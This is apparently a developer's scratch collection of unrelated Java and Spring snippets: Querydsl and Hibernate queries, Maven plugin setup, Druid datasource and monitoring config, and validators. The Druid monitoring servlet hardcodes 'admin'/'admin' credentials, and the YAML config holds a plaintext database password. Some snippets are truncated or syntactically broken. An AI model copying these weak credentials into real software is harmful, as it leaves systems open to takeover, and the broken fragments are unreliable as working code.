//                //.withEditDistanceUpTo(1)
//                //.withPrefixLength(1)
//                .onFields("version.version")
//                .matching(this.buildVersionInfo(fileSearchParameters.getVersion()))
//                .createQuery();
//        final Query localeQuery = querybuilder
//                .keyword()
//                //.fuzzy()
//                //.withEditDistanceUpTo(1)
//                //.withPrefixLength(1)
//                .onFields("version.locales")
//                .matching(new LocaleEntity())
//                .createQuery();
//        final Query combinedQuery = querybuilder
//                .bool()
//                .must(filePlatformQuery)
//                .must(productSkuQuery)
//                .must(versionQuery)
//                .must(localeQuery)
//                .createQuery();
//        final javax.persistence.Query jpaQuery = fullTextEntityManager.createFullTextQuery(combinedQuery, FileEntity.class);
//        return Optional.of((FileEntity) jpaQuery.getSingleResult());
-------------------------------------------------------------------------------------------------------
    @SuppressWarnings("unchecked")
    public Class<T> getTypeParameterClass() {
        Type type = getClass().getGenericSuperclass();
        ParameterizedType paramType = (ParameterizedType) type;
        return (Class<T>) paramType.getActualTypeArguments()[0];
    }
	
	@SuppressWarnings("SpringJavaAutowiringInspection")
-------------------------------------------------------------------------------------------------------
      <!-- Kubernetes library dependencies -->
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>kubernetes-annotations</artifactId>
            <version>${dekorate.version}</version>
        </dependency>
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>dekorate-spring-boot</artifactId>
            <version>${dekorate.version}</version>
        </dependency>
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>kubernetes-spring-starter</artifactId>
            <version>${project.version}</version>
        </dependency>
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>dekorate-core</artifactId>
            <version>${dekorate.version}</version>
        </dependency>
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>option-annotations</artifactId>
            <version>${dekorate.version}</version>
        </dependency>
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>core-junit</artifactId>
            <version>${dekorate.version}</version>
        </dependency>
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>kubernetes-junit</artifactId>
            <version>${dekorate.version}</version>
        </dependency>
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>prometheus-annotations</artifactId>
            <version>${dekorate.version}</version>
        </dependency>
        <dependency>
            <groupId>io.dekorate</groupId>
            <artifactId>jaeger-annotations</artifactId>
            <version>${dekorate.version}</version>
        </dependency>
        <dependency>
            <groupId>io.micrometer</groupId>
            <artifactId>micrometer-registry-prometheus</artifactId>
            <version>1.0.9</version>
        </dependency>
        <dependency>
            <groupId>io.micrometer</groupId>
            <artifactId>micrometer-registry-prometheus</artifactId>
            <version>1.0.9</version>
        </dependency>
-------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@ActiveProfiles("test")
@Transactional
@DataJpaTest
@AutoConfigureTestDatabase(replace=Replace.NONE)
public class IssueRepositoryIntegrationTests 

@EnableAutoConfiguration(exclude=AutoConfigureTestDatabase.class)
-------------------------------------------------------------------------------------------------------

	private static final Pattern PUNCTATION_PATTERN = Pattern.compile(".*((?![._])[\\p{Punct}|\\s])");
-------------------------------------------------------------------------------------------------------
     <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>${maven-compiler-plugin.version}</version>
                <configuration>
                    <annotationProcessorPaths>
                        <path>
                            <groupId>org.mapstruct</groupId>
                            <artifactId>mapstruct-processor</artifactId>
                            <version>${mapstruct.version}</version>
                        </path>
                        <path>
                            <groupId>org.projectlombok</groupId>
                            <artifactId>lombok</artifactId>
                            <version>${lombok.version}</version>
                        </path>
                        <path>
                            <groupId>io.dekorate</groupId>
                            <artifactId>kubernetes-annotations</artifactId>
                            <version>${project.version}</version>
                        </path>
                    </annotationProcessorPaths>
                </configuration>
            </plugin> 
-------------------------------------------------------------------------------------------------------
    @Bean
    public DataSource dataSource() {
        EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
        EmbeddedDatabase datasource = builder
                .setType(EmbeddedDatabaseType.HSQL)
                .addScript("db/create-db.sql")
                .build();

        return datasource;
    }
-------------------------------------------------------------------------------------------------------
java org.h2.tools.Server
    -tcp -tcpPort 9101
    -baseDir server1
	
java org.h2.tools.CreateCluster
    -urlSource jdbc:h2:tcp://localhost:9101/~/test
    -urlTarget jdbc:h2:tcp://localhost:9102/~/test
    -user sa
    -serverList localhost:9101,localhost:9102
	
java -cp h2*.jar org.h2.tools.Server

using System;
using java.sql;

class Test
{
    static public void Main()
    {
        org.h2.Driver.load();
        Connection conn = DriverManager.getConnection("jdbc:h2:~/test", "sa", "sa");
        Statement stat = conn.createStatement();
        ResultSet rs = stat.executeQuery("SELECT 'Hello World'");
        while (rs.next())
        {
            Console.WriteLine(rs.getString(1));
        }
    }
}
-------------------------------------------------------------------------------------------------------
import java.util.UUID;
import org.dozer.BeanFactory;

/**
 * {@code UuidBeanFactory} configures Dozer mapper to map UUID fields.
 * <p/>
 *
 * @author Indra Basak
 * @since 3/18/17
 */
public class UuidBeanFactory implements BeanFactory {
    @Override
    public Object createBean(Object source, Class<?> sourceClass,
            String targetBeanId) {
        if (source == null) {
            return null;
        }

        UUID uuidSrc = (UUID) source;
        UUID uuidDest = new UUID(uuidSrc.getMostSignificantBits(),
                uuidSrc.getLeastSignificantBits());
        return uuidDest;
    }
}
-------------------------------------------------------------------------------------------------------

import org.spring.boot.common.PagehelperUtils;

public interface IUserInfoService {
	/**
	 * @Title: listUser
	 * @Description: 查询用户列表
	 * @return List<UserInfo>
	 */
	@SuppressWarnings("rawtypes")
	public PagehelperUtils listUser();

	public void insert() throws Exception;
}
-------------------------------------------------------------------------------------------------------
import javax.sql.DataSource;

import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;

import com.alibaba.druid.pool.DruidDataSource;

@Configuration
public class DruidDataSourceConfiguration {
	@Bean  
	@Primary
    @ConfigurationProperties(prefix = "spring.datasource") 
    public DataSource druidDataSource() {  
        DruidDataSource druidDataSource = new DruidDataSource();  
        return druidDataSource;  
    }  
}
-------------------------------------------------------------------------------------------------------
@SpringBootApplication

public class SpringBootActuatorExampleApplication {

 public static void main(String[] args) {

  SpringApplication.run(SpringBootActuatorExampleApplication.class, args);

 }

 @Bean

 CommandLineRunner init(AccountRepository accountRepository,

  UsernamesRepository usernamesRepository) {

  return (evt) -> Arrays.asList(

    "ricksanchez,mortysmith,bethsmith,jerrysmith,summersmith,birdperson,squanchy,picklerick".split(","))

   .forEach(

    a -> {

     Account account = accountRepository.save(new Account(a,

      "password"));

     usernamesRepository.save(new Usernames(account,

      "http://example.com/login", a + "1"));

     usernamesRepository.save(new Usernames(account,

      "http://example2.com/login", "the_" + a));

    });
 }
}
-------------------------------------------------------------------------------------------------------
import java.util.Set;
 
import javax.validation.ConstraintViolation;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;
 
import com.howtodoinjava.example.model.User;
 
public class TestHibernateValidator
{
    public static void main(String[] args)
    {
        //Create ValidatorFactory which returns validator
        ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
         
        //It validates bean instances
        Validator validator = factory.getValidator();
 
        User user = new User(null, "1", "abcgmail.com");
 
        //Validate bean
        Set<ConstraintViolation<User>> constraintViolations = validator.validate(user);
 
        //Show errors
        if (constraintViolations.size() > 0) {
            for (ConstraintViolation<User> violation : constraintViolations) {
                System.out.println(violation.getMessage());
            }
        } else {
            System.out.println("Valid Object");
        }
    }
}

Validator validator = Validation.byDefaultProvider()
        .configure()
        .messageInterpolator(
                new ResourceBundleMessageInterpolator(
                        new AggregateResourceBundleLocator(
                                Arrays.asList(
                                        "messages",
                                        "otherMessages"
                                )
                        )
                )
        )
        .buildValidatorFactory()
        .getValidator();
-------------------------------------------------------------------------------------------------------
/**
 * @author Guillaume Smet
 */
public class FrenchAddressMixDirectAnnotationAndListContainer extends Address {

  @Override
  @FrenchZipcodeMixDirectAnnotationAndListContainer
  public String getZipCode() {
    return super.getZipCode();
  }

  @Pattern(regexp = ".....")
  @Pattern.List({ @Pattern(regexp = "bar") })
  @Constraint(validatedBy = FrenchZipcodeMixDirectAnnotationAndListContainerConstraintValidator.class)
  @Documented
  @Target({ METHOD, FIELD, TYPE })
  @Retention(RUNTIME)
  public @interface FrenchZipcodeMixDirectAnnotationAndListContainer {
    String message() default "Wrong zipcode";

    Class<?>[] groups() default { };

    Class<? extends Payload>[] payload() default {};

    @OverridesAttribute(constraint = Pattern.class, name = "regexp", constraintIndex = 1)
    String regex() default "\\d*";
  }
}
-------------------------------------------------------------------------------------------------------
@Documented
@Constraint(validatedBy = MyValidator.class)
@Target({METHOD, FIELD, ANNOTATION_TYPE, CONSTRUCTOR, PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
public @interface MyAnnotation {

    String message() default "message";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};
}

private MyAnnotation annotation;

@Override
public void initialize(MyAnnotation a)
{
    this.annotation = a;
}

@Override
public boolean isValid(String value, ConstraintValidatorContext ctx)
{
    String diff = getDiff(value, cleanForHTMLContext(value));
    if (diff.isEmpty())
        return true;

    String message = annotation.message();
    HibernateConstraintValidatorContext hctx = ctx.unwrap(HibernateConstraintValidatorContext.class);

    ctx.disableDefaultConstraintViolation();
    ctx.addExpressionVariable("diff", diff)
       .buildConstraintViolationWithTemplate(message)
       .addConstraintViolation();
    return false;
}
-------------------------------------------------------------------------------------------------------
        @Bean
        public EmbeddedServletContainerFactory servletContainer() {
            TomcatEmbeddedServletContainerFactory tomcat = new TomcatEmbeddedServletContainerFactory() {
                @Override
                protected void postProcessContext(Context context) {
                    SecurityConstraint securityConstraint = new SecurityConstraint();
                    securityConstraint.setUserConstraint("CONFIDENTIAL");
                    SecurityCollection collection = new SecurityCollection();
                    collection.addPattern("/*");
                    securityConstraint.addCollection(collection);
                    context.addConstraint(securityConstraint);
                }
            };
            tomcat.addAdditionalTomcatConnectors(redirectConnector());
            return tomcat;
        }
        private Connector redirectConnector() {
            Connector connector = new Connector("org.apache.coyote.http11.Http11NioProtocol");
            connector.setScheme("http");
            connector.setPort(8080);    // if requires comes from 8080 then redurect to 8443
            connector.setSecure(false);
            connector.setRedirectPort(8443);   // application will run on 8443
            return connector;
        }
		
server.ssl.enabled
-------------------------------------------------------------------------------------------------------
import javax.servlet.http.HttpServletRequest;

import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.After;
import org.aspectj.lang.annotation.AfterReturning;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.aspectj.lang.annotation.Pointcut;
import org.springframework.stereotype.Component;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

@Aspect
@Component
public class HttpAspect {
	
	@Pointcut("execution(public * org.spring.boot.controller.ExampleController.*(..))")
	public void log() {
		System.out.println("--------------------");
	}
	
	@Before("log()")
	public void doBefore(JoinPoint joinPoint) {
		ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
		HttpServletRequest request = requestAttributes.getRequest();
		System.out.println("url = " + request.getRequestURL().toString());
		System.out.println("ip = " + request.getRemoteAddr());
		System.out.println("method = " + request.getMethod());
		System.out.println("class_method = " + joinPoint.getSignature().getDeclaringTypeName() + "." + joinPoint.getSignature().getName());
		System.out.println("args = " + Arrays.toString(joinPoint.getArgs()));
	}
	
	@After("log()")
	public void doAfter() {
		System.out.println("---------2---------");
	}
	@AfterReturning(pointcut = "log()", returning = "obj")
	public void AfterReturn(Object obj) {
		System.out.println(obj.toString());
	}
	
	
}
-------------------------------------------------------------------------------------------------------
import javax.servlet.annotation.WebFilter;
import javax.servlet.annotation.WebInitParam;

import com.alibaba.druid.support.http.WebStatFilter;

@WebFilter(filterName = "druidWebStatFilter", urlPatterns = "/*", initParams = {
		@WebInitParam(name = "exclusions", value = "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*")
})		// 忽略资源
public class DruidStatFilter extends WebStatFilter {
}
-------------------------------------------------------------------------------------------------------
import javax.servlet.annotation.WebInitParam;
import javax.servlet.annotation.WebServlet;

import com.alibaba.druid.support.http.StatViewServlet;

@WebServlet(urlPatterns = "/druid/*", initParams = { @WebInitParam(name = "allow", value = "127.0.0.1"), // IP白名单(没有配置或者为空，则允许所有访问)
																											
		// IP黑名单 (存在共同时，deny优先于allow) : 如果满足deny的话提示:Sorry, you are not
		// permitted to view this page.
		@WebInitParam(name = "deny", value = "192.168.1.73"), // IP黑名单
		@WebInitParam(name = "loginUsername", value = "admin"), // 用户名
		@WebInitParam(name = "loginPassword", value = "admin"), // 密码
		@WebInitParam(name = "resetEnable", value = "false")// 禁用HTML页面上的“Reset All”功能
})
public class DruidStatViewServlet extends StatViewServlet {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
}
-------------------------------------------------------------------------------------------------------
server:
  port: 8080
  context-path: /example
user: 
  admin: 
    name: hello
    role: admin
#数据库设置
spring:
  datasource:
    type: com.alibaba.druid.pool.DruidDataSource
    driver-class-name: com.mysql.jdbc.Driver
    url: jdbc:mysql://172.16.192.103:3306/vport_oneway?characterEncoding=utf-8&autoReconnect=true&failOverReadOnly=false 
    username: oneway
    password: oneway
#-----------------------
#下面为连接池补充设置
    initialSize: 5
    # 配置获取连接等待超时的时间   
    maxWait: 60000
    # 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒
    timeBetweenEvictionRunsMillis: 60000
    # 配置一个连接在池中最小生存的时间，单位是毫秒 
    minEvictableIdleTimeMillis: 300000
    validationQuery: SELECT 1 FROM DUAL
    testWhileIdle: true
    testOnBorrow: false
    testOnReturn: false
    # 打开PSCache，并且指定每个连接上PSCache的大小
    poolPreparedStatements: true
    connectionProperties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000
    # 合并多个DruidDataSource的监控数据 
    useGlobalDataSourceStat: true
    
mybatis:
  mapper-locations: classpath*:org/spring/boot/mapper/*.xml
  check-config-location: true
  type-aliases-package: org.spring.boot.po
    
pagehelper: 
  autoDialect: true
  closeConn: false
  reasonable: true
-------------------------------------------------------------------------------------------------------
QInvoice invoice = QInvoice.invoice;
QCompany company = QCompany.company;

List<Invoice> list = new HibernateQuery(sessionFactory.getCurrentSession())
      .from(invoice).where(
      new HibernateSubQuery().from(invoice, company).where(
              invoice.supplier.number.eq(company.number).and(
              company.active.eq(true))).exists()).list(invoice);
			  
BooleanExpression exp = invoice.supplier.number.in(new JPASubQuery()
    .from(company)
    .where(company.active.isTrue())
    .list(company.nu‌​mber));
	
public class WhereClauseBuilder implements Predicate, Cloneable
{
    private BooleanBuilder delegate;

    public WhereClauseBuilder()
    {
        this.delegate = new BooleanBuilder();
    }

    public WhereClauseBuilder(Predicate pPredicate)
    {
        this.delegate = new BooleanBuilder(pPredicate);
    }

    public WhereClauseBuilder and(Predicate right)
    {
        return new WhereClauseBuilder(delegate.and(right));
    }

    public <V> WhereClauseBuilder optionalAnd(@Nullable V pValue, LazyBooleanExpression pBooleanExpression)
    {
        return applyIfNotNull(pValue, this::and, pBooleanExpression);
    }

    private <V> WhereClauseBuilder applyIfNotNull(@Nullable V pValue, Function<Predicate, WhereClauseBuilder> pFunction, LazyBooleanExpression pBooleanExpression)
    {
        if (pValue != null)
        {
            return new WhereClauseBuilder(pFunction.apply(pBooleanExpression.get()));
        }

        return this;
    }
   }

    @FunctionalInterface
    public interface LazyBooleanExpression
    {
        BooleanExpression get();
    }
	
	
	public EmployeeEntity getEmployees(String firstName, String lastName) {
    QEmployeeEntity employee = QEmployeeEntity.employeeEntity;

    return empployeeDAO.findAll
    (
       new WhereClauseBuilder()
           .optionalAnd(firstName, () -> employee.firstName.eq(firstName))
           .optionalAnd(lastName, () -> employee.lastName.eq(lastName))
    );
}

@Controller
class UserController {

  @Autowired UserRepository repository;

  @RequestMapping(value = "/", method = RequestMethod.GET)
  String index(Model model, @QuerydslPredicate(root = User.class) Predicate predicate,    
          Pageable pageable, @RequestParam MultiValueMap<String, String> parameters) {

    model.addAttribute("users", repository.findAll(predicate, pageable));

    return "index";
  }
}

@Entity
@NamedEntityGraph(name = "graph.CardCategoryLevel", attributeNodes = { @NamedAttributeNode("cardCategory"), @NamedAttributeNode("level") })
@Table(name = "card_categories_levels")
public class CardCategoryLevel extends BaseEntity implements Serializable {

    @Id
    @SequenceGenerator(name = "card_categories_levels_id_seq", sequenceName = "card_categories_levels_id_seq", allocationSize = 1)
    @GeneratedValue(strategy = GenerationType.AUTO, generator = "card_categories_levels_id_seq")
    private Long id;

    @OneToOne
    @JoinColumn(name = "card_category_id")
    private CardCategory cardCategory;

    @OneToOne
    @JoinColumn(name = "level_id")
    private Level level;

    @Column(name = "card_drop_rate")
    private Float cardDropRate;

    @OneToMany(cascade = CascadeType.ALL, fetch = FetchType.LAZY, mappedBy = "cardCategoryLevel")
    private List<Card> cards = new ArrayList<Card>();

...
}

@Repository
public interface CardCategoryLevelRepository extends JpaRepository<CardCategoryLevel, Long>, QueryDslPredicateExecutor<CardCategoryLevel> {

    @Override
    @EntityGraph(value = "graph.CardCategoryLevel", type = EntityGraphType.FETCH)
    Page<CardCategoryLevel> findAll(Predicate predicate, Pageable pageable);

....
}

public interface PersonRepository extends JpaRepository<Job, Integer>,
        QueryDslPredicateExecutor<Person>, QuerydslBinderCustomizer<QJob> {

    @Override
    public default void customize(final QuerydslBindings bindings, final QPerson person)     {
        bindings.bind(person.pets.any().name).first((path, value) -> {
            return path.eq(value);
        });
    }
}



    @Override
    public default void customize(final QuerydslBindings bindings, final QPerson person)     {
        bindings.bind(person.pets.any().name).first((path, value) -> {
            return path.eq(value);
        });
    }
-------------------------------------------------------------------------------------------------------
@Component
public class SwaggerWebFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        String path = request.getPath().pathWithinApplication().value();
        if (path.startsWith("/api/swagger-ui.html") || path.startsWith("/api/webjars")
                || path.startsWith("/api/api-docs") || path.startsWith("/api/configuration")
                || path.startsWith("/api/swagger-resources") || path.startsWith("/api/v2"))) {
            exchange = exchange.mutate().request(request.mutate().path(path.substring(4)).build()).build();
        }
        return chain.filter(exchange);
    }
}

-------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.system.handler;
//
//import com.paragon.mailingcontour.commons.configuration.BaseExceptionHandler;
//import lombok.RequiredArgsConstructor;
//import org.springframework.beans.factory.annotation.Value;
////import org.springframework.boot.web.servlet.error.ErrorAttributes;
//import org.springframework.boot.web.servlet.error.ErrorController;
//import org.springframework.http.HttpStatus;
//import org.springframework.http.ResponseEntity;
//import org.springframework.stereotype.Controller;
//import org.springframework.web.bind.annotation.RequestMapping;
//import org.springframework.web.bind.annotation.ResponseBody;
//import org.springframework.web.context.request.WebRequest;
//
//import javax.servlet.http.HttpServletResponse;
//import java.util.HashMap;
//import java.util.Map;
//
//@Controller
//@RequiredArgsConstructor
//public class BaseErrorController implements ErrorController {
//    //private final ErrorAttributes errorAttributes;
//
//    @Value("${server.error.path:${error.path:/error}}")
//    private String path;
//
//    @RequestMapping("${server.error.path:${error.path:/error}}")
//    @ResponseBody
//    public ResponseEntity<BaseExceptionHandler.ExceptionResponse> handleError(final WebRequest request, final HttpServletResponse response) {
//        final Map<String, Object> errorAttributes = this.getErrorAttributes(request, false);
//        return BaseExceptionHandler.buildResponse(String.valueOf(errorAttributes.get("path")), String.valueOf(errorAttributes.get("message")), HttpStatus.valueOf(response.getStatus()));
//    }
//
//    @Override
//    public String getErrorPath() {
//        return this.path;
//    }
//
//    private Map<String, Object> getErrorAttributes(final WebRequest request, final boolean includeStackTrace) {
//        final Map<String, Object> errorMap = new HashMap<>();
//        //errorMap.putAll(this.errorAttributes.getErrorAttributes(request, includeStackTrace));
//        return errorMap;
//    }
//}
-------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.paragon.microservices.distributor.system.constraint.LocaleNamePattern;
import com.querydsl.core.annotations.QueryEmbeddable;
import com.querydsl.core.annotations.QueryEmbedded;
import com.querydsl.core.annotations.QueryInit;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.experimental.UtilityClass;
import org.hibernate.search.annotations.*;
import org.springframework.validation.annotation.Validated;

import javax.persistence.MappedSuperclass;
import java.io.Serializable;

import static com.paragon.microservices.distributor.model.entity.LocaleInfoEntity.Info.LOCALE_NAME;
import static com.paragon.microservices.distributor.model.entity.LocaleInfoEntity.Info.MODEL_NAME;

/**
 * Locale info entity model
 */
@Data
@Builder
@Validated
@MappedSuperclass
@QueryEmbeddable
@AllArgsConstructor
@NoArgsConstructor
@JsonIgnoreProperties(ignoreUnknown = true)
@JsonInclude(JsonInclude.Include.NON_EMPTY)
@Indexed(index = MODEL_NAME)
@Analyzer(impl = org.apache.lucene.analysis.standard.StandardAnalyzer.class)
public class LocaleInfoEntity implements Serializable {

    /**
     * Default explicit serialVersionUID for interoperability
     */
    private static final long serialVersionUID = -6290509514067539190L;

    @QueryEmbedded
    @QueryInit("*.*")
    @JsonProperty(value = LOCALE_NAME, required = true)
    @Field(name = LOCALE_NAME, index = Index.YES, analyze = Analyze.YES, store = Store.YES)
    @LocaleNamePattern(message = "{model.entity.locale.name.pattern.notValid}")
    private String localeName;

    @UtilityClass
    public static final class Info {
        /**
         * Default model ID
         */
        static final String MODEL_NAME = "LocaleInfo";
        /**
         * Default field names
         */
        public static final String LOCALE_NAME = "locale";
    }
}
-------------------------------------------------------------------------------------------------------
String input = ...;
try {
    DateTimeFormatter formatter =
                      DateTimeFormatter.ofPattern("MMM d yyyy");
    LocalDate date = LocalDate.parse(input, formatter);
    System.out.printf("%s%n", date);
}
catch (DateTimeParseException exc) {
    System.out.printf("%s is not parsable!%n", input);
    throw exc;      // Rethrow the exception.
}

ZoneId leavingZone = ...;
ZonedDateTime departure = ...;

try {
    DateTimeFormatter format = DateTimeFormatter.ofPattern("MMM d yyyy  hh:mm a");
    String out = departure.format(format);
    System.out.printf("LEAVING:  %s (%s)%n", out, leavingZone);
}
catch (DateTimeException exc) {
    System.out.printf("%s can't be formatted!%n", departure);
    throw exc;
}
-------------------------------------------------------------------------------------------------------
@Controller
class UserController {

  @Autowired UserRepository repository;

  @RequestMapping(value = "/", method = RequestMethod.GET)
  String index(Model model, @QuerydslPredicate(root = User.class) Predicate predicate,    
          Pageable pageable, @RequestParam MultiValueMap<String, String> parameters) {

    model.addAttribute("users", repository.findAll(predicate, pageable));

    return "index";
  }
}
-------------------------------------------------------------------------------------------------------
LocalDate start = LocalDate.now();
LocalDate end = LocalDate.now().plusMonths(1).with(TemporalAdjusters.lastDayOfMonth());
 
//Create stream of dates
List<LocalDate> dates = Stream.iterate(start, date -> date.plusDays(1))
                            .limit(ChronoUnit.DAYS.between(start, end))
                            .collect(Collectors.toList());
 
// Get Min or Max Date
LocalDate maxDate = dates.stream()
                            .max( Comparator.comparing( LocalDate::toEpochDay ) )
                            .get();
 
LocalDate minDate = dates.stream()
                            .min( Comparator.comparing( LocalDate::toEpochDay ) )
                            .get();
 
System.out.println("maxDate = " + maxDate);
System.out.println("minDate = " + minDate);
-------------------------------------------------------------------------------------------------------
public
class
 QueryExtensions {
    @QueryDelegate(Date.class)
public
static
 BooleanExpression inPeriod(DatePath<Date> date, Pair<Date,Date> period) {
return
 date.goe(period.getFirst()).and(date.loe(period.getSecond()));
    }
    @QueryDelegate(Timestamp.class)
public
static
 BooleanExpression inDatePeriod(DateTimePath<Timestamp> timestamp, Pair<Date,Date> period) {
        Timestamp first = 
new
 Timestamp(DateUtils.truncate(period.getFirst(), Calendar.DAY_OF_MONTH).getTime());
        Calendar second = Calendar.getInstance();
        second.setTime(DateUtils.truncate(period.getSecond(), Calendar.DAY_OF_MONTH));
        second.add(
1
, Calendar.DAY_OF_MONTH);
return
 timestamp.goe(first).and(timestamp.lt(
new
 Timestamp(second.getTimeInMillis())));
    }
}
-------------------------------------------------------------------------------------------------------
import javax.persistence.Column;
import javax.persistence.GeneratedValue;
import javax.persistence.Id;
import javax.persistence.MappedSuperclass;

@MappedSuperclass
public abstract class AbstractEntity implements Cloneable{

    @Id
    @Column(name = "ID")
    @GeneratedValue(generator="SEQUENCE")
    private long id;

    public long getId() {
        return id;
    }

    @Override
    protected Object clone() throws CloneNotSupportedException{
        return super.clone();
    }
}
-------------------------------------------------------------------------------------------------------
<project>
        <build>
        <plugins>
          ...
          <plugin>
            <artifactId>maven-compiler-plugin</artifactId>
            <configuration>
              <generatedSourcesDirectory>target/generated-sources/java</generatedSourcesDirectory>
              <compilerArgs>
                <arg>-Aquerydsl.entityAccessors=true</arg>
                <arg>-Aquerydsl.useFields=false</arg>
              </compilerArgs>
            </configuration>
            <dependencies>
              <dependency>
                <groupId>com.querydsl</groupId>
                <artifactId>querydsl-apt</artifactId>
                <version>${querydsl.version}</version>
                <classifier>jpa</classifier>
              </dependency>
              <dependency>
                <groupId>org.hibernate.javax.persistence</groupId>
                <artifactId>hibernate-jpa-2.1-api</artifactId>
                <version>1.0.0.Final</version>
              </dependency>
            </dependencies>
          </plugin>
          ...
        </plugins>
        </build>
      </project>
-------------------------------------------------------------------------------------------------------
<plugin>
  <groupId>org.bsc.maven</groupId>
  <artifactId>maven-processor-plugin</artifactId>
  <executions>
    <execution>
      <id>process</id>
      <goals>
        <goal>process</goal>
      </goals>
      <phase>generate-sources</phase>
      <configuration>
        <processors>
          <processor>org.hibernate.jpamodelgen.JPAMetaModelEntityProcessor</processor>
        </processors>
      </configuration>
    </execution>
  </executions>
  <dependencies>
    <dependency>        
      <groupId>org.hibernate</groupId>
      <artifactId>hibernate-jpamodelgen</artifactId>
      <version>4.3.4.Final</version>
    </dependency>
  </dependencies>
</plugin>
-------------------------------------------------------------------------------------------------------
PUT http://localhost:8089/api/admin/v0/distributor/products/b7d41c8c-3072-486f-a640-1ae183e77fbb/versions/c4dfe4f0-bda1-4e3d-ae20-b184a545a408

{
  "version": "9.6.7.6.5675",
  "locales": "[{\"locale\":\"enet\"},{\"locale\":\"def5ers\"}]",
  "changelog": "changelog"
}
https://easyjava.ru/data/jpa/jpa-criteria/
GET http://localhost:8089/api/v0/distributor/download/myusers2?sku=sku-333d497a&version=9.7.6.5&locale=de&platform=x86

CriteriaBuilder builder = entityManager.getCriteriaBuilder();
CriteriaQuery<FileEntity> criteria = builder.createQuery(FileEntity.class);
Root<FileEntity> fromPerson = criteria.from(FileEntity.class);
criteria.select(fromPerson).where(builder.equal(fromPerson.get("version"), 1000));
TypedQuery<FileEntity> query = entityManager.createQuery(criteria);
List<FileEntity> peeps = query.getResultList();

this.getFileRepository().findOne(
QFileEntity.fileEntity.version().product().sku.equalsIgnoreCase(searchParameters.getSku())
.and(QFileEntity.fileEntity.version().locales.contains(new LocaleInfoEntity(searchParameters.getLocale())))
.and(QFileEntity.fileEntity.fileInfo().filePlatform.eq(searchParameters.getPlatform()))
)

this.getFileRepository().findOne(QFileEntity.fileEntity.version().locales.contains(new LocaleInfoEntity(searchParameters.getLocale())))

this.getFileRepository().findOne(QFileEntity.fileEntity.version().versionInfo().tokens.eq(new int[]{7,7,8,9}))
this.getFileRepository().findOne(QFileEntity.fileEntity.version().versionInfo().eq(new VersionInfoEntity(new int[]{1,2,3,4})))

QFileEntity.fileEntity.version().locales.any().in(new LocaleInfoEntity(searchParameters.getLocale()))

https://github.com/dpolican/jpaQuery

https://grokonez.com/spring-framework/spring-boot/how-to-execute-asynchronous-query-with-spring-jpa-and-postgresql-spring-boot
this.buildVersionInfo(searchParameters.getVersion())
queryFactory.selectFrom(user)
        .where(user.version().locales.any().in(new LocaleInfoEntity(searchParameters.getLocale())))
        .fetchAll().fetchResults();
queryFactory.selectFrom(user)
                .where(user.version().locales.any().localeName.isnotnull)
                .fetchAll().fetchResults();
queryFactory.selectFrom(user)
                .where(user.version().locales.contains(new LocaleInfoEntity(searchParameters.getLocale())))
                .fetchCount();
queryFactory.selectFrom(user)
                .where(user.version().locales.any().isnotnull)
                .fetchAll().fetchResults();

queryFactory.selectFrom(user)
                .where(user.version().locales.any().isnotnull)
                .fetchCount();
queryFactory.selectFrom(user)
                .where(user.version().locales.any().localeName.eq("ru"))
                .fetchAll().fetchResults();

List<License> result = query.from(license)
    .where(license.tags.any().in(tags))
    .listDistinct(license);
JPAQuery query = new JPAQuery (entityManager, EclipseLinkTemplates.DEFAULT);




https://javabeat.net/spring-data-jpa-querydsl-integration/


JPAQuery query = new JPAQuery(this.entityManager, EclipseLinkTemplates.DEFAULT);
query.from(user)
        .where(user.version().locales.any().in(new LocaleInfoEntity("ru")))
        .limit(1)
-------------------------------------------------------------------------------------------------------
  public static void main(String[] args) throws Exception {
      EntityManagerFactory emf =
              Persistence.createEntityManagerFactory("example-unit");
      try {
          persistEntities(emf);
          runTypeEqualsQuery(emf);
          runTypeInQuery(emf);
          runTypeNotInQuery(emf);
      } finally {
          emf.close();
      }
  }

  private static void persistEntities(EntityManagerFactory emf) throws Exception {
      System.out.println("-- Persisting entities --");
      EntityManager em = emf.createEntityManager();
      em.getTransaction().begin();
      for (Employee employee : createEmployees()) {
          em.persist(employee);
      }
      em.getTransaction().commit();
  }

  private static void runTypeEqualsQuery(EntityManagerFactory emf) {
      System.out.println("-- running TYPE with '=' query --");
      EntityManager em = emf.createEntityManager();
      List<Employee> entityAList = em.createQuery("SELECT t FROM Employee t WHERE TYPE(t) = FullTimeEmployee")
